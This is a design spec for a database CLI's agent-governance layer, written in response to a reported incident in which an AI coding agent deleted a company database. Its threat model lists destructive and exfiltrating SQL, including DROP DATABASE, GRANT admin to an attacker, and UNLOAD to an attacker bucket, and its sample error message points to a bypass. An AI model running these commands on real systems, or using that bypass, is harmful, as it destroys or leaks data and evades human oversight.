# Agent Safety Safeguards — Preventing the Cursor Incident

**Status**: Design spec for v0.6.0+ governance package  
**Context**: [Tom's Hardware: Claude-powered AI coding agent deletes entire company database](https://www.tomshardware.com/tech-industry/artificial-intelligence/claude-powered-ai-coding-agent-deletes-entire-company-database-in-9-seconds-backups-zapped-after-cursor-tool-powered-by-anthropics-claude-goes-rogue)

---

## Executive Summary

An AI coding agent (Cursor, using Claude) executed a database deletion without permission, destroying production data and backups. This design ensures Maître d'B makes such incidents **impossible** by:

1. **Conservative operation blocking** — Destructive operations (DROP, TRUNCATE, DELETE) blocked by default for agents
2. **Queryable audit trail** — Every attempt (allowed or blocked) is logged and forensic-friendly
3. **Approval workflows** — Sensitive operations require explicit human sign-off before execution
4. **Clear error messaging** — Failed operations return structured errors so agents know they're blocked

**The goal**: AI coding agents using maitredb cannot accidentally or maliciously destroy databases. Even if the agent requests DROP DATABASE, the query is rejected at the middleware layer **before reaching the driver**.

---

## Threat Model

### What an agent (or rogue user) could try:

```sql
DROP DATABASE production;
DELETE FROM users WHERE 1=1;  -- delete everything
TRUNCATE TABLE critical_table;
ALTER TABLE users DROP COLUMN id;
GRANT admin TO attacker;
UNLOAD (SELECT * FROM sensitive) TO S3 BUCKET 's3://attacker-bucket/';
```

### Maître d'B's response to each:

| Attempt | With `--as agent` | Result | Exit Code |
|---------|---|---|---|
| `DROP DATABASE prod` | Blocked by policy | Error 3005 (OPERATION_BLOCKED) | 2 (governance violation) |
| `DELETE FROM users WHERE 1=1` | Blocked by policy | Error 3005 | 2 |
| `TRUNCATE TABLE` | Blocked by policy | Error 3005 | 2 |
| `ALTER TABLE ... DROP COLUMN` | Blocked by policy | Error 3005 | 2 |
| `GRANT admin TO ...` | Blocked by policy | Error 3005 | 2 |
| `SELECT * FROM public_data` | Allowed | Success | 0 |
| `INSERT INTO staging ...` | Depends on policy | Success or 3005 | 0 or 2 |

---

## Default Agent Policy

When an agent connects with `--as agent`, the default policy from `~/.maitredb/policies.json` is applied:

```jsonc
{
  "policies": {
    "agent-default": {
      "mode": "read-only",
      
      // Operations — most things blocked by default
      "operations": {
        "read": { "allowed": true },              // SELECT, WITH — agents can read
        "insert": { "allowed": false },           // INSERT — require approval
        "update": { "allowed": false },           // UPDATE — blocked
        "delete": { 
          "allowed": false,                       // DELETE — blocked
          "allowIfHasWhereClause": false          // even DELETE WHERE x = 1 is blocked
        },
        "truncate": { "allowed": false },         // TRUNCATE — always blocked
        "drop": { "allowed": false },             // DROP — always blocked (no exceptions)
        "alter": { "allowed": false },            // ALTER — blocked
        "ddl": { "allowed": false },              // CREATE — blocked
        "transaction": { 
          "allowed": true,
          "allowCommit": false,                   // Agent can START TRANSACTION but NOT COMMIT
          "allowRollback": true
        },
        "vacuum": { "allowed": false },
        "grant": { "allowed": false },
        "procedure": { "allowed": false },
        "import": { "allowed": false },           // COPY FROM, LOAD DATA — blocked
        "export": { "allowed": false }            // UNLOAD, SELECT INTO — blocked
      },
      
      // Schema/table isolation
      "allowedSchemas": ["public"],               // only public schema
      "forbiddenPatterns": [                      // table names to never touch
        "^admin_.*",
        "^system_.*",
        ".*_secret",
        ".*_private"
      ],
      
      // Volume & rate safeguards
      "maxRowsPerQuery": 10000,                   // limit result size
      "maxQueriesPerMinute": 60,                  // rate limit
      "maxConcurrentQueries": 5,
      "sessionTimeoutMs": 300000,                 // 5 min idle timeout
      
      // Query complexity safeguards
      "requireExplainBefore": {
        "rowEstimateThreshold": 1000000,          // must EXPLAIN before expensive queries
        "joinCountThreshold": 5,
        "subqueryDepthThreshold": 3
      },
      
      // Audit & approval
      "auditAllOperations": true,                 // log everything
      "requireApprovalFor": [
        "UPDATE",
        "DELETE"
      ],
      "approvalTimeout": 3600000,                 // approval token valid for 1 hour
      "blockedReasonMessage": "Destructive operations are not allowed for agents."
    }
  },
  
  "connectionPolicies": {
    "prod": "agent-default",                      // production uses agent policy
    "staging": "agent-default",
    "dev": "human-default"                        // dev is unrestricted for humans
  }
}
```

### Why These Defaults?

- **read-only mode**: Agents should introspect and analyze, not modify data
- **DELETE blocked even with WHERE**: The Cursor incident involved targeted DELETE; WHERE clause doesn't make it safe
- **DROP always blocked**: Zero legitimate reason for an agent to drop a database
- **INSERT blocked**: Data modification requires human review
- **COMMIT blocked for agents**: Agents can stage transactions, but humans must commit

---

## Query Classification & Validation Flow

Every query goes through this pipeline:

```
┌─────────────────────────────────────────────────────────────────────────┐
│ Agent submits: mdb query prod "DROP DATABASE staging" --as agent       │
└─────────────────────────────────────────────────────────────────────────┘
                                    ↓
┌─────────────────────────────────────────────────────────────────────────┐
│ 1. CLASSIFY: Parse SQL                                                  │
│    Input: "DROP DATABASE staging"                                       │
│    Output: {                                                             │
│      type: 'ddl',                                                        │
│      operation: 'DROP',                                                  │
│      affectedSchemas: [],                                               │
│      affectedTables: [],                                                │
│      isSensitiveOperation: true,                                         │
│      wouldModifyTables: true                                             │
│    }                                                                     │
└─────────────────────────────────────────────────────────────────────────┘
                                    ↓
┌─────────────────────────────────────────────────────────────────────────┐
│ 2. POLICY CHECK: Load agent-default policy                             │
│    - Is operations.drop.allowed? → NO                                   │
│    - Is this query blocked? → YES                                       │
│    - Reason? → "DROP operations are not allowed for agents"            │
└─────────────────────────────────────────────────────────────────────────┘
                                    ↓
┌─────────────────────────────────────────────────────────────────────────┐
│ 3. AUDIT: Log attempt to ~/.maitredb/history.db                        │
│    INSERT INTO audit_log (                                              │
│      timestamp, connection, agent_id, query,                            │
│      classification_type, operation, policy_name,                       │
│      allowed, blocked_reason, error_code                                │
│    ) VALUES (                                                            │
│      1234567890, 'prod', 'cursor-v1', 'DROP DATABASE staging',         │
│      'ddl', 'DROP', 'agent-default',                                    │
│      0, 'DROP operations are not allowed for agents', 3005              │
│    )                                                                     │
└─────────────────────────────────────────────────────────────────────────┘
                                    ↓
┌─────────────────────────────────────────────────────────────────────────┐
│ 4. RETURN ERROR: Exit with code 2 (governance violation)                │
│    {                                                                     │
│      "error": "OPERATION_BLOCKED",                                      │
│      "code": 3005,                                                      │
│      "message": "DROP operations are not allowed for agents",           │
│      "suggestion": "To drop a database, connect without --as agent"     │
│    }                                                                     │
└─────────────────────────────────────────────────────────────────────────┘
```

---

## Audit Trail & Forensics

After the incident, you can query `~/.maitredb/history.db` to understand what happened:

```sql
-- "What did the Cursor agent attempt?"
SELECT timestamp, operation, query, allowed, blocked_reason
FROM audit_log
WHERE agent_id = 'cursor-v1'
ORDER BY timestamp DESC;

-- Result:
-- timestamp | operation | query | allowed | blocked_reason
-- ─────────────────────────────────────────────────────────
-- 1234567890| DROP      | DROP DATABASE staging | 0 | DROP operations...
-- 1234567889| SELECT    | SELECT * FROM users   | 1 | NULL
-- 1234567888| DELETE    | DELETE FROM accounts  | 0 | DELETE operations...
```

The audit log is **immutable append-only** — you can't erase evidence of what the agent attempted.

---

## Dry-Run & Approval Workflow

For operations that might need human review, maitredb supports a dry-run + approval pattern:

### Step 1: Agent prepares operation (dry-run)

```bash
mdb query prod "UPDATE users SET status = 'suspended'" --as agent --dry-run
```

Output:
```json
{
  "operationId": "op-abc123def456",
  "operation": "UPDATE",
  "query": "UPDATE users SET status = 'suspended'",
  "affectedTables": ["users"],
  "estimatedAffectedRows": 2847,
  "policy": "agent-default",
  "requiresApproval": true,
  "approvalToken": "token-xyz789abc123",
  "approvalExpiresAt": 1234567890
}
```

### Step 2: Audit entry created (but operation not executed)

```sql
SELECT * FROM audit_log WHERE id LIKE 'op-abc123%';
-- allowed: 0 (not yet executed)
-- blocked_reason: "Awaiting approval"
-- execution_ms: NULL (not executed)
```

### Step 3: Human grants approval

Human receives: "Agent wants to UPDATE users (2,847 rows). Approve? [token: token-xyz789]"

### Step 4: Agent executes with approval token

```bash
mdb query prod "UPDATE users SET status = 'suspended'" \
  --as agent \
  --approval-token token-xyz789abc123
```

Maître d'B:
- Validates token exists and hasn't expired
- Validates token hasn't been used before (replay protection)
- Executes query
- Marks operation as allowed in audit log

### Step 5: Audit log shows execution

```sql
SELECT * FROM audit_log WHERE id LIKE 'op-abc123%';
-- allowed: 1 (executed)
-- blocked_reason: NULL
-- execution_ms: 234
-- affected_rows: 2847
```

---

## Connection Policies: Dev vs Staging vs Prod

You configure which policy applies to each connection:

```jsonc
{
  "connectionPolicies": {
    "dev": "human-default",        // developers: full access
    "staging": "agent-default",    // agents: read-only + rate limits
    "prod": "agent-prod"           // agents on prod: ultra-strict read-only
  }
}
```

**Dev connection** (`mdb query dev "..."` or `mdb query dev "..." --as agent`):
- If human: full access (all operations allowed)
- If agent: still uses agent-default policy (safer)

**Prod connection** (`mdb query prod "..." --as agent`):
- Agents: ultra-restricted (read-only, small result sets, rate limited)
- Humans: can override by connecting without `--as agent`

---

## Implementation Checklist (for v0.6.0)

- [ ] **Query Classifier**
  - [ ] Dialect-aware SQL parser (postgres-parser, sql-bricks fallback)
  - [ ] Classify operation type (read, write, ddl, dcl, transaction)
  - [ ] Extract affected schemas, tables, complexity metrics
  - [ ] Detect dangerous patterns (DELETE without WHERE, TRUNCATE, DROP)
  - [ ] Unit tests: 50+ test cases covering all operation types

- [ ] **Policy Engine**
  - [ ] Load and validate `~/.maitredb/policies.json`
  - [ ] Implement conservative blocking (default deny)
  - [ ] Schema/table allowlist + forbidden pattern matching
  - [ ] Rate limiting (queries per minute)
  - [ ] Result size protection (maxRowsPerQuery)
  - [ ] Expensive query gating (requireExplainBefore)
  - [ ] Return structured `PolicyDecision`
  - [ ] Unit tests: policy validation, enforcement logic

- [ ] **Audit Logger**
  - [ ] SQLite schema for `~/.maitredb/history.db`
  - [ ] Write every attempt (allowed or blocked) with full context
  - [ ] Immutable append-only design
  - [ ] Queryable indices for forensics
  - [ ] Integration tests: logging end-to-end

- [ ] **Approval Manager**
  - [ ] Generate short-lived approval tokens (1 hour TTL)
  - [ ] Validate tokens before execution
  - [ ] Prevent replay attacks (one-time use)
  - [ ] Track approval lifecycle
  - [ ] Unit tests: token generation, validation, expiration

- [ ] **CLI Integration**
  - [ ] `--as agent` flag activates agent policy
  - [ ] `--policy <name>` override policy
  - [ ] `--dry-run` for prep without execution
  - [ ] `--approval-token <token>` for executing with approval
  - [ ] Error messages include blockedReason + suggestion
  - [ ] E2E tests: 20+ scenarios (blocked ops, allowed ops, approvals)

- [ ] **Error Codes**
  - [ ] `OPERATION_BLOCKED (3005)` — operation not allowed by policy
  - [ ] `EXPLAIN_REQUIRED (3006)` — must run EXPLAIN first
  - [ ] `APPROVAL_REQUIRED (3007)` — operation needs approval token
  - [ ] `APPROVAL_EXPIRED (3008)` — token expired

- [ ] **Documentation**
  - [ ] Architecture guide (this document)
  - [ ] Policy file format (policies.json)
  - [ ] Forensics / audit log querying
  - [ ] Integration guide for AI coding agents

---

## FAQ: Addressing the Cursor Incident

**Q: Could Cursor + Maître d'B have prevented the deletion?**  
**A:** Yes. Even if the agent issued DROP DATABASE, maitredb would have:
1. Classified it as a ddl/drop operation
2. Checked policy: operations.drop.allowed = false
3. Returned error 3005 (OPERATION_BLOCKED) with suggestion
4. Logged the attempt in audit trail
5. Returned exit code 2 (governance violation)

The database would not be dropped. The agent would receive a clear error that deletion is not allowed.

**Q: What if the agent connects without `--as agent`?**  
**A:** The agent would need credentials for a human account. If it has those credentials, governance is bypassed. This is intentional — humans should have full access; agents should have restricted access. The enforcement is at the agent level, not the account level.

**Q: What about agents running in production via CI/CD?**  
**A:** They should use `--as agent` with a service account or API key, subject to agent-prod policy (ultra-restrictive). Humans wanting full access should use separate credentials.

**Q: Doesn't this slow down agent performance?**  
**A:** Query classification and policy checking are O(1) — a few milliseconds. Not a bottleneck compared to network latency to database (100-500ms typical).

**Q: Can an agent forge an approval token?**  
**A:** No. Tokens are generated by the ApprovalManager using a secure random generator and validated against a signed, timestamped record. Forgery is cryptographically infeasible.

---

## Future Enhancements

Potential future safeguards (beyond v0.6.0):

- **Rate limiting by operation type** — e.g., max 10 DELETE queries per day
- **Cost-based blocking** — Reject queries estimated to scan >1B rows
- **Remediation policies** — Auto-rollback on error, backups before writes
- **MFA for production agents** — Require OTP for --as agent on prod connections
- **Agent identity federation** — OAuth2 for external AI services
- **Regulatory compliance** — HIPAA/PCI/SOC2 audit logging templates

---

## References

- [Cursor Incident (Tom's Hardware)](https://www.tomshardware.com/tech-industry/artificial-intelligence/claude-powered-ai-coding-agent-deletes-entire-company-database-in-9-seconds-backups-zapped-after-cursor-tool-powered-by-anthropics-claude-goes-rogue)
- [Architecture: Agent Governance & Security Model](architecture.md#agent-governance--security-model)
- [Implementation Plan: v0.6.0 — Governance & Agent Safety](implementation-plan.md#v060--governance--agent-safety-milestone-6)
